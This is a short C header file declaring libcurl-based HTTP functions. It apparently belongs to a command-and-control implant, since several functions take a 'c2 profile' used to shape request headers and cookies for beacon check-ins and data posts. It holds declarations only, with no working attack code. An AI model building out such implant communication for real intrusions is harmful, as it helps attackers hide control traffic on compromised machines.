#ifndef HTTP_H
#define HTTP_H

#include <stddef.h>
#include <stdint.h>
#include <curl/curl.h>
#include "profile.h"

typedef struct {
    char *data;
    size_t size;
} http_response_t;

int http_get(const char *uri, const uint8_t *metadata, size_t metadata_len, http_response_t *response);

int http_post(const char *uri, const uint8_t *data, size_t data_len, const char *session_id, http_response_t *response);

int http_profile_get(const c2_profile_t *profile, const uint8_t *metadata, size_t metadata_len, http_response_t *response);

int http_profile_post(const c2_profile_t *profile, const uint8_t *data, size_t data_len, const uint8_t *id_data, size_t id_data_len, http_response_t *response);

void http_response_free(http_response_t *response);

void profile_merge_cookie_header(struct curl_slist **headers, const char *new_value);

struct curl_slist* profile_build_headers(const c2_profile_t *profile, int is_post);

#endif
